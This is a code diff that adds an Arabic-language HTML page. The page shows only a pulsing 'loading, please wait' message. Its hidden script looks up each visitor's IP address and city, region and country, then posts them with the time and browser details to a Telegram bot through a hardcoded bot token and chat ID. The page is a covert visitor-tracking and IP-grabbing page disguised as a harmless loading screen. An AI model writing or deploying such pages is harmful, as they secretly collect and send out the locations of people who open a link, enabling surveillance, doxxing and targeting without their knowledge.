@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>جارٍ التحميل...</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f9f9f9;
+      text-align: center;
+      padding-top: 100px;
+      color: #333;
+    }
+    h1 {
+      animation: pulse 1.5s infinite;
+    }
+    @keyframes pulse {
+      0% { opacity: 0.3; }
+      50% { opacity: 1; }
+      100% { opacity: 0.3; }
+    }
+  </style>
+</head>
+<body>
+
+  <h1>جارٍ تحميل الصفحة...</h1>
+  <p>يرجى الانتظار...</p>
+
+  <script>
+    fetch("https://ipinfo.io/json?token=78f82a58cf90c7")
+      .then(response => response.json())
+      .then(data => {
+        const message = `
+📡 زائر جديد!
+-------------------
+🌐 IP: ${data.ip}
+📍 الموقع: ${data.city}, ${data.region}, ${data.country}
+🕒 الوقت: ${new Date().toLocaleString()}
+💻 الجهاز: ${navigator.userAgent}
+        `;
+
+        const telegramToken = "7570507358:AAHU9_f-AAVHIZrem4A-_5Q0HUt7on_vHes";
+        const chatId = "909892172";
+        const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+
+        fetch(url, {
+          method: "POST",
+          headers: {"Content-Type": "application/json"},
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message
+          })
+        });
+      })
+      .catch(error => {
+        const failMessage = `فشل في جلب بيانات الزائر: ${error}`;
+        const telegramToken = "7570507358:AAHU9_f-AAVHIZrem4A-_5Q0HUt7on_vHes";
+        const chatId = "909892172";
+        const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+
+        fetch(url, {
+          method: "POST",
+          headers: {"Content-Type": "application/json"},
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: failMessage
+          })
+        });
+      });
+  </script>
+
+</body>
+</html>
